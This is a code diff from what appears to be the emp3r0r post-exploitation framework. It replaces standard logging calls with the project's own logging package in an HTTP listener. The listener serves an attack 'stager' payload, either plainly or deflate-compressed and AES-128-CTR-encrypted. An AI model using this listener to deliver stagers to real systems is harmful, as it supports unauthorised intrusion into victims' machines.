@@ -10,7 +10,7 @@ import (
 	"encoding/binary"
 	"encoding/hex"
 	"fmt"
-	"log"
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"net/http"
 	"os"
 )
@@ -21,19 +21,19 @@ var server *http.Server
 // The IV is prepended to the encrypted data.
 func encryptData(data []byte, key []byte) []byte {
 	if len(key) != 16 {
-		log.Fatalf("Key length must be 16 bytes for AES-128-CTR")
+		logging.Fatalf("Key length must be 16 bytes for AES-128-CTR")
 	}
 	block, err := aes.NewCipher(key)
 	if err != nil {
-		log.Fatalf("Failed to create AES cipher: %v", err)
+		logging.Fatalf("Failed to create AES cipher: %v", err)
 	}
 
 	// Generate a random IV
 	iv := make([]byte, aes.BlockSize)
 	if _, err := rand.Read(iv); err != nil {
-		log.Fatalf("Failed to generate IV: %v", err)
+		logging.Fatalf("Failed to generate IV: %v", err)
 	}
-	log.Printf("Generated IV: %s", hex.EncodeToString(iv))
+	logging.Printf("Generated IV: %s", hex.EncodeToString(iv))
 
 	// Use CTR mode for encryption
 	stream := cipher.NewCTR(block, iv)
@@ -50,11 +50,11 @@ func compressData(data []byte) []byte {
 	var b bytes.Buffer
 	w, err := flate.NewWriter(&b, flate.BestCompression)
 	if err != nil {
-		log.Fatalf("Failed to create deflate writer: %v", err)
+		logging.Fatalf("Failed to create deflate writer: %v", err)
 	}
 	_, err = w.Write(data)
 	if err != nil {
-		log.Fatalf("Failed to compress data: %v", err)
+		logging.Fatalf("Failed to compress data: %v", err)
 	}
 	w.Close()
 	return b.Bytes()
@@ -73,26 +73,26 @@ func deriveKeyFromString(str string) []byte {
 	for i, v := range key {
 		binary.LittleEndian.PutUint32(keyBytes[i*4:], v)
 	}
-	log.Printf("Derived key: %08x %08x %08x %08x\n", key[0], key[1], key[2], key[3])
+	logging.Printf("Derived key: %08x %08x %08x %08x\n", key[0], key[1], key[2], key[3])
 	return keyBytes[:16] // Ensure the key is 16 bytes long
 }
 
 // serveStager serves the encrypted stager file over HTTP.
 func serveStager(stager_enc []byte, port string) error {
 	if server != nil {
-		log.Printf("Shutting down existing server on port %s", server.Addr)
+		logging.Printf("Shutting down existing server on port %s", server.Addr)
 		if err := server.Shutdown(context.TODO()); err != nil {
-			log.Printf("Error shutting down server: %v", err)
+			logging.Printf("Error shutting down server: %v", err)
 		}
 	}
 
 	mux := http.NewServeMux()
 	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-		log.Printf("Received request from %s", r.RemoteAddr)
+		logging.Printf("Received request from %s", r.RemoteAddr)
 		w.Header().Set("Content-Type", "application/octet-stream")
 		w.Header().Set("Content-Length", fmt.Sprintf("%d", len(stager_enc)))
 		w.Write(stager_enc)
-		log.Printf("Served encrypted stager to %s", r.RemoteAddr)
+		logging.Printf("Served encrypted stager to %s", r.RemoteAddr)
 	})
 
 	server = &http.Server{
@@ -100,7 +100,7 @@ func serveStager(stager_enc []byte, port string) error {
 		Handler: mux,
 	}
 
-	log.Printf("Starting HTTP server on port %s", port)
+	logging.Printf("Starting HTTP server on port %s", port)
 	return server.ListenAndServe()
 }
 
@@ -124,7 +124,7 @@ func HTTPAESCompressedListener(stagerPath string, port string, keyStr string, co
 	}
 	encryptedStager := encryptData(toEncrypt, key)
 
-	log.Printf("Serving encrypted stager file on port %s", port)
+	logging.Printf("Serving encrypted stager file on port %s", port)
 	return serveStager(encryptedStager, port)
 }
 
@@ -135,6 +135,6 @@ func HTTPBareListener(stagerPath string, port string) error {
 		return fmt.Errorf("failed to read stager file: %v", err)
 	}
 
-	log.Printf("Serving stager file on port %s", port)
+	logging.Printf("Serving stager file on port %s", port)
 	return serveStager(stager, port)
 }
